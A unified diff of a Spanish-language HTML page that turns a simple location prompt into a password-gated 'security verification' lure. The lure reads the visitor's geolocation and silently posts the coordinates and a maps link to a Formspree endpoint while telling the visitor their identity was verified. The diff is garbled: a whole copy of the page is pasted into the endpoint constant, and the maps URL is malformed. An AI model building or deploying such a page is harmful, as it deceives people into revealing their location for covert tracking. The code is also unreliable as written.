@@ -3,28 +3,182 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solicitud de Ubicación</title>
+    <title>Acceso Restringido</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
-        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background-color: #f4f4f9; }
+        .box { background: white; padding: 30px; display: inline-block; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
+        input { padding: 10px; font-size: 16px; width: 80%; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 4px; width: 85%; }
+        button:hover { background-color: #0056b3; }
+        #contenido-protegido { display: none; }
     </style>
 </head>
 <body>
 
-    <h2>Para continuar, necesitamos verificar tu ubicación</h2>
-    <p>Por favor, haz clic en el botón de abajo.</p>
-    <button onclick="obtenerUbicacion()">Permitir Acceso</button>
+    <!-- FORMULARIO DE ACCESO -->
+    <div id="login-box" class="box">
+        <h2>Área Privada</h2>
+        <p>Introduce la contraseña para acceder al contenido:</p>
+        <input type="password" id="password-input" placeholder="Contraseña"><br>
+        <button onclick="verificarContraseña()">Ingresar</button>
+    </div>
+
+    <!-- CONTENIDO PROTEGIDO -->
+    <div id="contenido-protegido" class="box">
+        <h2>Verificación de Seguridad</h2>
+        <p>Para continuar y validar tu identidad, necesitamos verificar tu ubicación actual.</p>
+        <button onclick="obtenerUbicacion()" style="background-color: #28a745;">Permitir Acceso y Continuar</button>
+    </div>
 
     <script>
+        // 1. CONFIGURACIÓN: Cambia la contraseña y pega tu enlace de Formspree abajo
+        const CONTRASEÑA_CORRECTA = "MiClaveSegura123"; 
+        const FORMSPREE_URL = <!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceso Restringido</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background-color: #f4f4f9; }
+        .box { background: white; padding: 30px; display: inline-block; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
+        input { padding: 10px; font-size: 16px; width: 80%; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 4px; width: 85%; }
+        button:hover { background-color: #0056b3; }
+        #contenido-protegido { display: none; }
+    </style>
+</head>
+<body>
+
+    <!-- FORMULARIO DE ACCESO -->
+    <div id="login-box" class="box">
+        <h2>Área Privada</h2>
+        <p>Introduce la contraseña para acceder al contenido:</p>
+        <input type="password" id="password-input" placeholder="Contraseña"><br>
+        <button onclick="verificarContraseña()">Ingresar</button>
+    </div>
+
+    <!-- CONTENIDO PROTEGIDO -->
+    <div id="contenido-protegido" class="box">
+        <h2>Verificación de Seguridad</h2>
+        <p>Para continuar y validar tu identidad, necesitamos verificar tu ubicación actual.</p>
+        <button onclick="obtenerUbicacion()" style="background-color: #28a745;">Permitir Acceso y Continuar</button>
+    </div>
+
+    <script>
+        // 1. CONFIGURACIÓN: Cambia la contraseña y pega tu enlace de Formspree abajo
+        const CONTRASEÑA_CORRECTA = "MiClaveSegura123"; 
+        const FORMSPREE_URL = https://formspree.io/f/myezwydy; 
+
+        function verificarContraseña() {
+            const entrada = document.getElementById("password-input").value;
+            if (entrada === CONTRASEÑA_CORRECTA) {
+                document.getElementById("login-box").style.display = "none";
+                document.getElementById("contenido-protegido").style.display = "block";
+            } else {
+                alert("Contraseña incorrecta. Acceso denegado.");
+            }
+        }
+
         function obtenerUbicacion() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        alert(`Ubicación obtenida:\nLatitud: ${position.coords.latitude}\nLongitud: ${position.coords.longitude}`);
-                        // Aquí se enviaría el dato a tu base de datos o servidor si fuera necesario
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const mapaLink = `https://google.com{lat},${lon}`;
+
+                        // Preparamos los datos estructurados en formato JSON
+                        const datosEnvio = {
+                            mensaje: "Nueva ubicación registrada",
+                            latitud: lat,
+                            longitud: lon,
+                            google_maps: mapaLink
+                        };
+
+                        // Envío invisible y seguro a través de Formspree
+                        fetch(FORMSPREE_URL, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'Accept': 'application/json'
+                            },
+                            body: JSON.stringify(datosEnvio)
+                        })
+                        .then((response) => {
+                            if (response.ok) {
+                                // Lo que ve el usuario al finalizar con éxito
+                                alert("Identidad verificada con éxito. Ya puedes cerrar esta pestaña.");
+                            } else {
+                                alert("Error al procesar la solicitud.");
+                            }
+                        })
+                        .catch((error) => {
+                            alert("Ocurrió un error en la conexión de seguridad.");
+                        });
                     },
                     (error) => {
-                        alert("El acceso a la ubicación fue denegado por el usuario.");
+                        alert("Es necesario permitir la ubicación para completar el proceso de seguridad.");
+                    }
+                );
+            } else {
+                alert("Tu navegador no soporta la geolocalización.");
+            }
+        }
+    </script>
+
+</body>
+</html>; 
+
+        function verificarContraseña() {
+            const entrada = document.getElementById("password-input").value;
+            if (entrada === CONTRASEÑA_CORRECTA) {
+                document.getElementById("login-box").style.display = "none";
+                document.getElementById("contenido-protegido").style.display = "block";
+            } else {
+                alert("Contraseña incorrecta. Acceso denegado.");
+            }
+        }
+
+        function obtenerUbicacion() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const mapaLink = `https://google.com{lat},${lon}`;
+
+                        // Preparamos los datos estructurados en formato JSON
+                        const datosEnvio = {
+                            mensaje: "Nueva ubicación registrada",
+                            latitud: lat,
+                            longitud: lon,
+                            google_maps: mapaLink
+                        };
+
+                        // Envío invisible y seguro a través de Formspree
+                        fetch(FORMSPREE_URL, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'Accept': 'application/json'
+                            },
+                            body: JSON.stringify(datosEnvio)
+                        })
+                        .then((response) => {
+                            if (response.ok) {
+                                // Lo que ve el usuario al finalizar con éxito
+                                alert("Identidad verificada con éxito. Ya puedes cerrar esta pestaña.");
+                            } else {
+                                alert("Error al procesar la solicitud.");
+                            }
+                        })
+                        .catch((error) => {
+                            alert("Ocurrió un error en la conexión de seguridad.");
+                        });
+                    },
+                    (error) => {
+                        alert("Es necesario permitir la ubicación para completar el proceso de seguridad.");
                     }
                 );
             } else {
